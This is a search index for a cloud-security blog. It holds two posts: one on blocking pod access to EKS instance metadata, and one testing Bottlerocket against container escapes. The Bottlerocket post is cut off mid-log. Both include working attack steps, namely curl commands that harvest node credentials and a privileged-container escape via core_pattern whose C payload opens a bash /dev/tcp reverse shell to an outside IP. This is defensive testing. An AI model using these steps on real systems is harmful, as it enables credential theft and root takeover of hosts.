{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Cloud &amp; Container Security","text":""},{"location":"#pitfallen-pitfawlen-adj","title":"pitfallen (<code>pit\u00b7fawl\u00b7en</code>) [adj]","text":""},{"location":"#educated-in-the-art-of-making-things-work-through-the-full-enumeration-of-all-possible-routes-destined-to-fail","title":"Educated in the art of making things work, through the full enumeration of all possible routes destined to fail.","text":""},{"location":"#recent-posts","title":"Recent Posts","text":""},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/","title":"EKS Hardening: Blocking Pod-Level Access to IMDS","text":"<p>Effectively securing pods inside an EKS cluster, swirling with cloud permissions, has always been challenging. Is it possible to close off a well-known source of risk, while still ensuring basic functionality?</p> <p></p>"},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/#introduction","title":"Introduction","text":"<p>The principle of role-based access control (RBAC) within kubernetes is built on a simple idea - provide only the permissions required by an individual process (pod, in this case) in order for it to do its job. There's a lot riding on this control: get it right, and pods managing all kinds of different workloads can safely operate alongside each other in a common environment; get it wrong though, and there is the very real risk of simple vulnerabilities escalating into potentially disastrous outcomes.</p> <p>The situation isn't helped by the fact that, within a kubernetes cluster, not all players are equal. Pods may only need basic permissions to perform their specific task (pulling messages from SQS, writing files to S3 etc.) but something has to provide the resources for those pods to run on, which is the role of the worker nodes. These nodes require access at a more fundamental (and impactful) level - they need to be able to pull the images that run the workloads, as well as understand the resources and configuration of the environment they exist within.</p> <p>A lot of this functionality is handled via the Internal Metadata Service (IMDS), a locally-accessible API that provides access to configuration data, as well as the credentials needed for the node to authenticate itself. IMDS was never intended to service anything but the hosting node, but the nature of the container runtime (EKS uses containerd) means that pods are simply processes running atop the worker, allowing them to access the infamous <code>http://169.254.169.254</code> address just as easily. Since the first version of IMDS (<code>IMDSv1</code>) was built with no method of authentication, this enabled a straightforward path to privilege escalation that resulted in a number of high-profile incidents, such as the Capital One data breach in 2019.</p> <p>In response, Amazon introduced IMDSv2 and took a major step forward in reducing this risk, by mandating use of the metadata API must first involve generation of a session token via an <code>HTTP PUT</code> request. This token must then be supplied via a header in all subsequent requests. Asssuming that IMDSv2 is not just enabled but actually enforced, this prevents an attacker from proxying metadata requests using various common methods, such as abusing a misconfigured firewall, unrestricted reverse proxy or server-side request forgery (SSRF) vulnerability. And yet, it still doesn't fully address the problem.</p>"},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/#the-remaining-threat-rce","title":"The Remaining Threat: RCE","text":"<p>By itself, the new approach to security in IMDSv2 is still vulnerable to abuse through the discovery of remote code execution (RCE). An attacker who can execute commands inside a running pod (via uploading a web-shell, discovery a command injection vulnerability or similar) can easily promote themselves to node-level access. How easily? Simply request a session token via curl:</p> <pre><code>TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" -s)\n</code></pre> <p>then use that token to retrieve instance credentials from the node via IMDS: <pre><code>curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/karpenter-worker/\n\n{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2025-08-04T06:23:29Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"ASIA4VDBL2NIXYVXTEPT\",\n  \"SecretAccessKey\" : \"d5NB5Jr/y+018xfUdjtuNO/3Q9sxmps21bW6rGK1\",\n  \"Token\" : \"IQoJb3Jp...B6alm4tBg6A==\",\n  \"Expiration\" : \"2025-08-04T12:57:32Z\"\n}\n</code></pre></p> <p>These values can then be set as environment variables:</p> <pre><code>export AWS_ACCESS_KEY_ID=\"ASIA4VDBL2NIXYVXTEPT\"\nexport AWS_SECRET_ACCESS_KEY=\"d5NB5Jr/y+018xfUdjtuNO/3Q9sxmps21bW6rGK1\"\nexport AWS_SESSION_TOKEN=\"IQoJb3Jp...B6alm4tBg6A==\"\n</code></pre> <p>And with very little effort, the attacker has assumed the worker node's role: <pre><code>aws sts get-caller-identity\n{\n    \"UserId\": \"AROA4VDBL2CUDQE2KIGEY:i-0db92f4d7339c0c95\",\n    \"Account\": \"000000000000\",\n    \"Arn\": \"arn:aws:sts::000000000000:assumed-role/karpenter-worker/i-0db92f4d7339c0c95\"\n}\n</code></pre></p> <p>EKS worker nodes are typically configured with roles that include a number of AWS managed policies, enabling several privileged actions that are likely to be of interest to an attacker:</p> <p>AmazonEKSWorkerNodePolicy <pre><code>{\n  \"Version\" : \"2012-10-17\",\n  \"Statement\" : [\n    {\n      \"Sid\" : \"WorkerNodePermissions\",\n      \"Effect\" : \"Allow\",\n      \"Action\" : [\n        \"ec2:DescribeInstances\",\n        \"ec2:DescribeInstanceTypes\",\n        \"ec2:DescribeRouteTables\",\n        \"ec2:DescribeSecurityGroups\",\n        \"ec2:DescribeSubnets\",\n        \"ec2:DescribeVolumes\",\n        \"ec2:DescribeVolumesModifications\",\n        \"ec2:DescribeVpcs\",\n        \"eks:DescribeCluster\",\n        \"eks-auth:AssumeRoleForPodIdentity\"\n      ],\n      \"Resource\" : \"*\"\n    }\n  ]\n}\n</code></pre></p> <p>AmazonEC2ContainerRegistryReadOnly <pre><code>{\n  \"Version\" : \"2012-10-17\",\n  \"Statement\" : [\n    {\n      \"Effect\" : \"Allow\",\n      \"Action\" : [\n        \"ecr:GetAuthorizationToken\",\n        \"ecr:BatchCheckLayerAvailability\",\n        \"ecr:GetDownloadUrlForLayer\",\n        \"ecr:GetRepositoryPolicy\",\n        \"ecr:DescribeRepositories\",\n        \"ecr:ListImages\",\n        \"ecr:DescribeImages\",\n        \"ecr:BatchGetImage\",\n        \"ecr:GetLifecyclePolicy\",\n        \"ecr:GetLifecyclePolicyPreview\",\n        \"ecr:ListTagsForResource\",\n        \"ecr:DescribeImageScanFindings\"\n      ],\n      \"Resource\" : \"*\"\n    }\n  ]\n}\n</code></pre></p> <p>There are clearly a number of privileges here that would prove very useful when enumerating a cloud environnment, such as <code>ec2:DescribeInstances</code> and <code>ec2:DescribeSecurityGroups</code>. Similarly, the ability to browse through and download images from all ECR repositories (<code>ecr.DescribeRepositories</code>, <code>ecr.ListImages</code> and <code>ecr.GetAuthorizationToken</code>) are likely to yield additional sensitive information, from images typically thought of as 'private'.</p> <p>To be clear, these are privileges that nodes absolutely need in order to function as part of the EKS cluster. But the risk of them being stolen from application pods running on the nodes represents a serious threat. All that it takes is for a public-facing app to be shipped with an RCE vulnerability - either through inclusion of insecure code, or the use of a vulnerable dependency - and a large part of the EKS cluster's cloud environment is exposed, even if IMDSv2 is enforced.</p>"},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/#the-solution-imds-hop-limit","title":"The Solution: IMDS Hop Limit?","text":"<p>There is usually more to the story, however, and in this case it comes in the form of the IMDS response hop limit. The AWS documentation outlines the purpose of this setting:</p> <p>The hop limit is the number of network hops that the PUT response is allowed to make. You can set the hop limit to a minimum of 1 and a maximum of 64.</p> <p>Essentially operating as a packet-level time to live (TTL), the hop limit dictates how far across the network a token (PUT) response can travel. Setting it to the minimum value of <code>1</code> means it can only reach the calling node itself, which again is absolutely required for normal cluster operation. A value of <code>2</code> allows the response to travel up to two hops, meaning it could reach the pods running on a node - exactly where it might be attainable via RCE.</p> <p>Based on this information then, it sounds like the obvious choice would be to simply set the hop limit of all nodes to <code>1</code>. The docs, however, also include a vague note of caution on this:</p> <p>In a container environment, a hop limit of 1 can cause issues.</p> <p>In other words, under certain security configurations, pods may need to be able to call IMDS on their host nodes in order to perform their intended function. This could be for the purposes of obtaining credentials, or even something as seemingly harmless as identifying the region the node exists in. So while setting the IMDS hop limit to <code>1</code> might seem like a good way to improve security, it might also prevent pods from running at all, which is definitely not ideal. To further complicate matters, it seems that when a hop limit is not explicitly specified (via a launch template or similar) AWS will often set a default hop limit of <code>2</code>, leading many to believe that this is infact the required value for their EKS cluster to function correctly.</p> <p>Clearly, there is some confusion around what is really possible with this setting. The only real way to understand the situation is to try out some different configurations, and evaluate the results.</p>"},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/#the-challenge","title":"The Challenge","text":"<p>So the question becomes - can we mandate a metadata response hop limit of <code>1</code>, thereby preventing the threat of privilege escalation from a compromised pod, while still allowing pods to operate correctly?</p> <p>Pod-level security mechanisms have evolved a lot over the years, to the point where there are a number of choices when it comes to management. In this post, we'll evaluate the feasability of configuring pods to successfully run on nodes with a hop limit of <code>1</code> using two common solutions:</p> <ol> <li>IAM Roles for Service Accounts (IRSA)</li> <li>PodIdentity</li> </ol>"},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/#environment-setup","title":"Environment Setup","text":"<p>In order to easily provision worker nodes with the different hop limit configurations we need, we'll use karpenter, a high-performance kubernetes autoscaler built by AWS. We can deploy two different <code>EC2NodeClasses</code> (node configurations) into an existing EKS cluster. The first named <code>ec2nc-with-hop-limit-2</code> will set a hop limit value of <code>2</code> (the current default in our cluster):</p> <pre><code>apiVersion: karpenter.k8s.aws/v1beta1\nkind: EC2NodeClass\nmetadata:\n  name: ec2nc-with-hop-limit-2\nspec:\n  amiFamily: AL2023\n  instanceProfile: KarpenterNodeInstanceProfile-${CLUSTER_NAME}\n  metadataOptions:\n    httpTokens:\n    httpPutResponseHopLimit: 2\n</code></pre> <p>and the second named <code>ec2nc-with-hop-limit-1</code> will set a hop limit value of <code>1</code>: <pre><code>apiVersion: karpenter.k8s.aws/v1beta1\nkind: EC2NodeClass\nmetadata:\n  name: ec2nc-with-hop-limit-1\nspec:\n  amiFamily: AL2023\n  instanceProfile: KarpenterNodeInstanceProfile-${CLUSTER_NAME}\n  metadataOptions:\n    httpTokens:\n    httpPutResponseHopLimit: 1\n</code></pre></p> <p>We then wrap these <code>EC2NodeClasses</code> in karpenter <code>NodePools</code>, which essentially just provide a way to reference &amp; request nodes of that configuration:</p> <pre><code>apiVersion: karpenter.sh/v1beta1\nkind: NodePool\nmetadata:\n  name: np-with-hop-limit-2\nspec:\n  template:\n    spec:\n      requirements:\n      ...\n      nodeClassRef:\n        apiVersion: karpenter.k8s.aws/v1beta1\n        kind: EC2NodeClass\n        name: ec2nc-with-hop-limit-2\n  ...\n</code></pre> <pre><code>apiVersion: karpenter.sh/v1beta1\nkind: NodePool\nmetadata:\n  name: np-with-hop-limit-1\nspec:\n  template:\n    spec:\n      requirements:\n      ...\n      nodeClassRef:\n        apiVersion: karpenter.k8s.aws/v1beta1\n        kind: EC2NodeClass\n        name: ec2nc-with-hop-limit-1\n  ...\n</code></pre> <p>In order the assess whether pods running on these two different <code>NodePools</code> can still interact with AWS resources in a functioning way, we'll use a basic pod spec that starts an alpine linux container that can be used to issue aws cli commands:</p> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: hop-limit-demo-app\nspec:\n  containers:\n  - name: demo-app\n    image: alpine:latest\n    command: [\"tail\", \"-f\", \"/dev/null\"]\n  nodeSelector:\n    nodepool: # set to either np-with-hop-limit-2 or np-with-hop-limit-1\n</code></pre> <p>With the demo pod deployed to both <code>NodePools</code>, we can immediately see the effect of setting <code>httpPutResponseHopLimit</code> via the <code>EC2NodeClass</code>. When running on a node using the <code>ec2nc-with-hop-limit-2</code> configuration, token requests from the pod to IMDS work as normal: <pre><code>curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" -v\n*   Trying 169.254.169.254:80...\n* Connected to 169.254.169.254 (169.254.169.254) port 80\n* using HTTP/1.x\n&gt; PUT /latest/api/token HTTP/1.1\n&gt; Host: 169.254.169.254\n&gt; User-Agent: curl/8.14.1\n&gt; Accept: */*\n&gt; X-aws-ec2-metadata-token-ttl-seconds: 21600\n&gt;\n&lt; HTTP/1.1 200 OK\n&lt; X-Aws-Ec2-Metadata-Token-Ttl-Seconds: 21600\n&lt; Content-Length: 56\n&lt; Date: Wed, 30 Jul 2025 23:22:04 GMT\n&lt; Server: EC2ws\n&lt; Connection: close\n&lt; Content-Type: text/plain\n&lt;\n* we are done reading and this is set to close, stop send\n* abort upload\n* shutting down connection #0\nAQAEAIXkhdOR3sIqAVRdg0mVAdHYRr_fkfFDU7SDzH9whlWZJwANKg==/\n</code></pre></p> <p>Running the same request on a pod deployed using <code>ec2nc-with-hop-limit-1</code>, however, times out when requesting a token: <pre><code>curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" -v\n*   Trying 169.254.169.254:80...\n* Connected to 169.254.169.254 (169.254.169.254) port 80\n* using HTTP/1.x\n&gt; PUT /latest/api/token HTTP/1.1\n&gt; Host: 169.254.169.254\n&gt; User-Agent: curl/8.14.1\n&gt; Accept: */*\n&gt; X-aws-ec2-metadata-token-ttl-seconds: 21600\n&gt;\n* Request completely sent off\n* Recv failure: Connection reset by peer\n* closing connection #0\ncurl: (56) Recv failure: Connection reset by peer\n</code></pre></p> <p>With our two testing environments prepared, we can now evaluate the pod-level mechanisms to understand if they are impacted by the hop limit.</p>"},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/#experiment-1-iam-roles-for-service-accounts-irsa","title":"Experiment 1. IAM Roles for Service Accounts (IRSA)","text":"<p>Also released by AWS in 2019, IRSA provides a means for kubernetes workloads to access AWS services and resources, through use of OpenID Connect (OIDC). In order to test our setup against IRSA, we need to modify the configuration of our demo app to include:</p> <ol> <li> <p>A <code>ServiceAccount</code> object, bound to an IAM role via annotation: <pre><code>apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: hop-limit-demo-app-sa\n  annotations:\n    eks.amazonaws.com/role-arn: arn:aws:iam::000000000000:role/hop-limit-demo-app-role\n</code></pre></p> </li> <li> <p>A reference to the <code>ServiceAccount</code> in the pod's spec: <pre><code>spec:\n  serviceAccountName: hop-limit-demo-app-sa\n  containers:\n  ...\n</code></pre></p> </li> </ol> <p>Additionally, an IAM role <code>hop-limit-demo-app-role</code> will need to be created in the hosting AWS account, with a trust policy that allows it to be assumed via OIDC. The role also requires an IAM policy that enables the permissions our app needs to function. For the purposes of this experiment, we'll assume our demo app simply needs to be able to list and interact (put, delete, update) with objects in an S3 bucket:</p> <pre><code>aws iam create-role --role-name hop-limit-demo-app-role \\\n--assume-role-policy-document \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":{\\\"Federated\\\":\\\"arn:aws:iam::000000000000:oidc-provider/oidc.eks.us-west-2.amazonaws.com/id/24E3DC8B5FG87CD57B2B0ZZ8D6B7079X\\\"},\\\"Action\\\":\\\"sts:AssumeRoleWithWebIdentity\\\",\\\"Condition\\\":{\\\"StringEquals\\\":{\\\"oidc.eks.us-west-2.amazonaws.com/id/24E3DC8B5FG87CD57B2B0ZZ8D6B7079X:aud\\\":\\\"sts.amazonaws.com\\\",\\\"oidc.eks.us-west-2.amazonaws.com/id/24E3DC8B5FG87CD57B2B0ZZ8D6B7079X:sub\\\":\\\"system:serviceaccount:hop-limit-demo-app:hop-limit-demo-app-sa\\\"}}}]}\"\n\naws iam put-role-policy --role-name hop-limit-demo-app-role \\\n--policy-name hop-limit-demo-app-policy \\\n--policy-document \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Action\\\":[\\\"s3:ListBucket\\\",\\\"s3:*Object\\\"],\\\"Resource\\\":[\\\"arn:aws:s3:::hop-limit-demo-app-bucket\\\",\\\"arn:aws:s3:::hop-limit-demo-app-bucket/*\\\"],\\\"Effect\\\":\\\"Allow\\\"}]}\"\n</code></pre> <p>After creating the new IAM role &amp; policy, and deploying the new manifests, we can confirm that the pod running on a node with a hop limit of <code>2</code> has no problems identifying itself via <code>get-caller-identity</code>: <pre><code>aws sts get-caller-identity\n{\n    \"UserId\": \"AROA4VDBL2NISX2M4YIVX:botocore-session-1754021985\",\n    \"Account\": \"000000000000\",\n    \"Arn\": \"arn:aws:sts::000000000000:assumed-role/hop-limit-demo-app-role/botocore-session-1754021985\"\n}\n</code></pre></p> <p>It's also perfectly able to perform the actions in the attached policy, including writing objects to an S3 bucket and listing the contents: <pre><code>/ aws s3 cp /tmp/test.txt s3://hop-limit-demo-app-bucket/test.txt\nupload: tmp/test.txt to s3://hop-limit-demo-app-bucket/test.txt\n\n/ aws s3 ls hop-limit-demo-app-bucket\n2025-08-01 04:24:40          5 test.txt\n</code></pre></p> <p>If the demo app is deployed to a node with hop limit of <code>1</code>, we can confirm that its privileges remain unaffected, despite no longer having access to IMDS: <pre><code>aws sts get-caller-identity\n{\n    \"UserId\": \"AROA4VDBL2NISX2M4YIVX:botocore-session-1754200769\",\n    \"Account\": \"000000000000\",\n    \"Arn\": \"arn:aws:sts::000000000000:assumed-role/hop-limit-demo-app-role/botocore-session-1754200769\"\n}\n\n/ aws s3 cp /tmp/test.txt s3://hop-limit-demo-app-bucket/test.txt\nupload: tmp/test.txt to s3://hop-limit-demo-app-bucket/test.txt\n\n/ aws s3 ls hop-limit-demo-app-bucket\n2025-08-01 04:26:37          6 test.txt\n</code></pre></p> <p>Verdict: Successful</p> <p>Pods running with privileges supplied via IAM Roles for Service Accounts (IRSA) are compatible with an IMDS hop limit of <code>1</code>.</p>"},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/#experiment-2-podidentity","title":"Experiment 2. PodIdentity","text":"<p>PodIdentity was released in 2023 as an attempt to simplify authenticating kubernetes workloads in AWS, by allowing the ServiceAccount-to-IAM-role connection (known as a <code>Pod Identity Association</code>) to be created via the EKS console or the <code>eksctl</code> CLI.</p> <p>To test out this approach, we need to again create an IAM role with an appropriate permissions policy. Note that in this case however, the role's trust policy does not reference OIDC, as it plays no part in PodIdentity (a positive side-effect of PodIdentity is that a single role can be accessed from multiple EKS clusters, without needing to update the trust policy to include each cluster's unique OIDC provider):</p> <pre><code>aws iam create-role --role-name hop-limit-demo-app-role-pod-identity \\\n--assume-role-policy-document \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Effect\\\":\\\"Allow\\\",\\\"Principal\\\":{\\\"Service\\\":\\\"pods.eks.amazonaws.com\\\"},\\\"Action\\\":[\\\"sts:AssumeRole\\\", \\\"sts:TagSession\\\"]}]}\"\n\naws iam put-role-policy --role-name hop-limit-demo-app-role-pod-identity \\\n--policy-name hop-limit-demo-app-pod-identity-policy \\\n--policy-document \"{\\\"Version\\\":\\\"2012-10-17\\\",\\\"Statement\\\":[{\\\"Action\\\":[\\\"s3:ListBucket\\\",\\\"s3:*Object\\\"],\\\"Resource\\\":[\\\"arn:aws:s3:::hop-limit-demo-app-bucket\\\",\\\"arn:aws:s3:::hop-limit-demo-app-bucket/*\\\"],\\\"Effect\\\":\\\"Allow\\\"}]}\"\n</code></pre> <p>We then create the pod identity association, that binds the IAM role to a specific service account within a single namespace: <pre><code>aws eks create-pod-identity-association \\\n--cluster-name tmb-npd-usw2-eks \\\n--namespace hop-limit-demo-app \\\n--service-account hop-limit-demo-app-pod-identity-sa \\\n--role-arn arn:aws:iam::000000000000:role/hop-limit-demo-app-role-pod-identity  \n</code></pre></p> <p>With the new ServiceAccount <code>hop-limit-demo-app-pod-identity-sa</code> bound to the pod, we can deploy it to our two node configurations for evaluation. Running on a node with a hop limit of <code>2</code>, the pod is again able to identify itself and access the S3 bucket as expected:</p> <pre><code>aws sts get-caller-identity\n{\n    \"UserId\": \"AROA4VDBL2NITVDU7NO6C:eks-demo-cluster-hop-limit--832f49b9-b135-44f3-b6a4-d586ce81119f\",\n    \"Account\": \"000000000000\",\n    \"Arn\": \"arn:aws:sts::000000000000:assumed-role/hop-limit-demo-app-role-pod-identity/eks-demo-cluster-hop-limit--832f49b9-b135\n-44f3-b6a4-d586ce81119f\"\n}\n\n/ aws s3 cp /tmp/test3.txt s3://hop-limit-demo-app-bucket/test3.txt\nupload: tmp/test3.txt to s3://hop-limit-demo-app-bucket/test3.txt\n/ aws s3 ls s3://hop-limit-demo-app-bucket\n2025-08-03 06:18:25          6 test3.txt\n</code></pre> <p>And again, even when deployed to a node with a hop limit of <code>1</code>, the pod continues to function correctly:</p> <pre><code>aws sts get-caller-identity\n{\n    \"UserId\": \"AROA4VDBL2NITVDU7NO6C:eks-demo-cluster-hop-limit--27102cfa-a547-4625-9e56-c2f863c99793\",\n    \"Account\": \"000000000000\",\n    \"Arn\": \"arn:aws:sts::000000000000:assumed-role/hop-limit-demo-app-role-pod-identity/eks-demo-cluster-hop-limit--27102cfa-a547\n-4625-9e56-c2f863c99793\"\n}\n\n/ aws s3 cp /tmp/test4.txt s3://hop-limit-demo-app-bucket/test4.txt\nupload: tmp/test4.txt to s3://hop-limit-demo-app-bucket/test4.txt\n/ aws s3 ls s3://hop-limit-demo-app-bucket\n2025-08-03 06:20:39          6 test4.txt\n</code></pre> <p>Verdict: Successful</p> <p>As with IRSA, pods running with privileges supplied PodIdentity are also compatible with an IMDS hop limit of <code>1</code>.</p>"},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/#results-considerations","title":"Results &amp; Considerations","text":"<p>Based on these results, implementing pod-level authentication using either IRSA or PodIdentity seems to be compatible with nodes configured with an IMDS hop limit of <code>1</code>.</p> <p>Enforcing this setting can have a meaningful impact on the security posture of an EKS cluster, by reducing the blast radius in the event that an attacker achieved pod-level RCE. As mentioned earlier, simply swapping to IMDSv2 is not enough to mitigate this kind of threat - pods need to be fully blocked from accessing the IMDS API, which is where the hop limit setting comes in to play.</p> <p>Given that both experiments proved successful, a valid question becomes - is there any configuration that might be problematic with a hop limit of <code>1</code>? Some research seems to suggest a few configurations that might be problematic, neither of which is likely to affect well-architected applications running in modern infrastructure:</p> <ol> <li> <p>Old versions of EKS add-ons that are not fully optimised for IMDSv2 - these may still rely on IMDS to determine necessary environment details, such as AWS region, instance ID etc.</p> </li> <li> <p>Custom code or scripts - any kind of code that specifically makes a request to IMDS (again, usually for retrieving envirnoment details like AWS region) will most likely break if nodes are configured with a hop limit of <code>1</code>.</p> </li> </ol>"},{"location":"blog/eks-hardening-blocking-pod-level-access-to-imds/#conclusion","title":"Conclusion","text":"<p>Can It Be Done?</p> <p>As long as applications are properly configured with IRSA or PodIdentity, enforcing an IMDS hop limit of <code>1</code> should not impact their ability to function, and it will improve the security of your cluster.</p>"},{"location":"blog/hands-on-with-aws-bottlerocket/","title":"Hands On with AWS Bottlerocket: Evaluating the Security of Amazon's Hardened OS","text":"<p>AWS Bottlerocket is well-known as a secure, minimalist operating system, often used to provide a reliable container hosting environment through enhanced security features and reduced attack surface. But how does it actually work when faced with common container escape techniques? Read on to find out!</p> <p></p>"},{"location":"blog/hands-on-with-aws-bottlerocket/#introduction","title":"Introduction","text":"<p>When it comes to deciding how to configure a kubernetes cluster, choosing an operating system for the worker nodes isn't always the first thing that comes to mind. Often, users will simply go with their chosen cloud provider's default offering (Amazon Linux for AWS, Container-Optimized OS for GCP, Azure Linux for.. Azure). Others will opt for an OS they might be familiar with, such as Ubuntu Linux, out of a desire for familiarity - should there be a need to interact with the nodes for troubleshooting purposes, knowing where to look for certain log files, or how to install and run common debugging utilities, can be a big help when trying to resolve problems.</p> <p>For those seeking to maximise the security of their cluster, however, AWS Bottlerocket should definitely be considered. First released in 2020, the project aims to provide a reliable and highly secure opearting system, by employing a number of complimentary features:</p> <ol> <li> <p>a read-only root filesystem via the dm-verity kernel module, that provides transparent integrity checking of the block device using a cryptographic hash tree. Any change to the hash will lead to the kernel detecting corruption, triggering an immediate reboot</p> </li> <li> <p>an always-enabled and enforced, restrictive SELinux policy, for the parts of the filesystem that are mutable. When used as a worker node OS, this helps prevent containers from executing dangerous operations on the host and each other, even when they run as root</p> </li> <li> <p>no command shell, package manager or language interpreters are installed. OS updates are managed by a utility known as TUF (The Update Framework), which delivers atomic, cryptographically-signed update images, as well as blocking malicious rollback attacks and the use of compromised repository keys. Administration tasks are carried out using two purpose-built containers: the control container intended for standard management tasks, and the admin container for high-privilege &amp; emergency tasks. These are both run by a completely separate instance of the container runtime (containerd) to that which runs applications and workloads in a cluster, further enhancing security</p> </li> <li> <p>ephemeral, template-rendered system configuration files, such as those residing in <code>/etc</code>. The settings for these files are actually retrieved from an internal Bottlerocket API, helping to block common methods of persistence, e.g malicious cron entries</p> </li> <li> <p>kernel lockdown via integrity mode, that prevents an attacker with sufficient privileges from loading unsigned kernel modules</p> </li> <li> <p>confidentiality mode which takes integrity mode one step further, by preventing an attacker from also reading any of the kernel's memory from userspace</p> </li> </ol>"},{"location":"blog/hands-on-with-aws-bottlerocket/#the-premise","title":"The Premise","text":"<p>While the official documentation from AWS does a good job of providing a high-level overview of how these security features work, I typically find it much more instructive to get hands-on with this kind of thing and test out some actual attack paths, in order to better understand how the defence mechanisms work. In that spirit, this post aims to provide a short overview of how Bottlerocket is able to defeat three well-established container escape techniques, while a less-hardened OS (Ubuntu default install, in this case) may fail.</p> <p>To be clear, none of the container escape techniques listed here are novel, and they all depend on the ill advised (yet still common) practice of running containers in privileged mode. A lot has already been written about this subject and while most people know it's a bad idea, the pressure to deploy a new release on a tight schedule or get some new application feature working means that it still happens. Not falling into the trap of deploying containers in privileged mode is one of the most beneficial security practices you can implement.</p> <p>With that out of the way, let's deploy some containers and start escaping!</p>"},{"location":"blog/hands-on-with-aws-bottlerocket/#technique-1-abusing-the-kernel-usermode-helper-by-triggering-a-coredump","title":"Technique 1: Abusing the Kernel Usermode Helper by Triggering a Coredump","text":"<p>As outlined in this research paper from pwning.systems, containers running in privileged mode can be escaped by abusing the kernel usermode helper. This attack involves configuring a malicious binary that will be run on the host (as root) when a coredump occurs inside the container, something that can easily be achieved.</p> <p>The first step is to craft a payload to be run on the host. Some common examples for Linux-based environments include:</p> <ul> <li>adding a new ssh key to <code>/root/.ssh/authorized_keys</code></li> <li>copying or modifying <code>/etc/passwd</code> or <code>/etc/shadow</code> (or any other system config file)</li> <li>triggering a reverse shell via <code>bash</code>, <code>python3</code>, <code>nc</code> etc.</li> </ul> <p>For this demonstration our payload will be a simple reverse shell one-liner, that connects out to a netcat listener on a waiting AWS EC2 (with the assumed IP <code>15.230.15.77</code>). Written in C, the source for the payload is straightforward: <pre><code>// payload.c\n#include &lt;stdlib.h&gt;\n\nint main() {\n  const char *cmd = \"bash -i &gt;&amp; /dev/tcp/15.230.15.77/4444 0&gt;&amp;1\";\n  system(cmd);\n  return 0;\n}\n</code></pre></p> <p>Once compiled via <code>gcc -o payload payload.c</code>, the next task is to identify where the <code>payload</code> binary actually exists, but on the host's filesystem. Container runtimes typically use overlayfs or similar to provide containers with what appears to be dedicated, isolated storage space, but in reality is just a folder stored on the node's filesystem. The path to this folder on the node can be retrieved by running <code>mount</code> and looking for the <code>upperdir</code> value: <pre><code>root@priv-app-ubuntu:/# mount\noverlay on / type overlay (rw,relatime,seclabel,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/178/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/work,uuid=on)\n...\n</code></pre></p> <p>To prime the attack, we set the value of <code>/proc/sys/kernel/core_pattern</code> to the payload at the upperdir path, prefixed with a <code>|</code> character. As outlined in the research paper, this has the effect of the value being interpreted as a command to run in the event of a coredump: <pre><code>echo \"|/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/fs/payload\" &gt; /proc/sys/kernel/core_pattern\n</code></pre></p> <p>From this point, we simply need to trigger a coredump in the container. This can be achieved in a number of ways, one of which is by running some deliberately broken C code that dereferences a null pointer: <pre><code>// trigger.c\n#include &lt;stdio.h&gt;\n\nint main() {\n    int *ptr = NULL;\n    *ptr = 10;\n\n    return 0;\n}\n</code></pre></p> <p>From a container running on a Ubuntu-based node, compiling and running the trigger causes a coredump as expected: <pre><code>root@priv-app-ubuntu:/# gcc -o trigger trigger.c\nroot@priv-app-ubuntu:/# ./trigger\nSegmentation fault (core dumped)\n</code></pre></p> <p>which in turn leads to a root-level reverse shell from the node being caught on the waiting EC2 \ud83d\udc80 <pre><code>[ec2-user@ip-10-240-150-240 tmp]$ nc -lvnp 4444\nNcat: Version 7.93 ( https://nmap.org/ncat )\nNcat: Listening on :::4444\nNcat: Listening on 0.0.0.0:4444\nNcat: Connection from 51.26.193.49.\nNcat: Connection from 51.26.193.49:18796.\nsh: cannot set terminal process group (-1): Inappropriate ioctl for device\nsh: no job control in this shell\nsh-5.2# whoami\nwhoami\nroot\n</code></pre></p> <p>How might the situation change if the container was running on a Bottlerocket node? Using the same privileged setup, an attacker running loose inside the container can still perform the necessary setup steps listed above (retrieve the <code>upperdir</code> value using <code>mount</code>, compile a payload and set <code>/proc/sys/kernel/core_pattern</code>, then trigger a coredump inside the container):</p> <pre><code>root@priv-app-bottlerocket:/# ./trigger\nSegmentation fault\n</code></pre> <p>However this time, the waiting reverse shell listener remains unanswered: <pre><code>[ec2-user@ip-10-240-150-240 tmp]$ nc -lvnp 4444\nNcat: Version 7.93 ( https://nmap.org/ncat )\nNcat: Listening on :::4444\nNcat: Listening on 0.0.0.0:4444\n...\n</code></pre></p> <p>What happened? As explained in the intro, Bottlerocket runs with SELinux enabled, a kernel security module that enforces mandatory access control via a labelling system. This prevents processes in a container from running in unexpected places, such as the host or another container. The node's system log confirms that SELinux has blocked execution of the malicious payload as intended: <pre><code>...\nAVC avc:  denied  { execute_no_trans } for  pid=6151 comm=\"kworker/u4:4\" path=\"/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/62/fs/payload\" 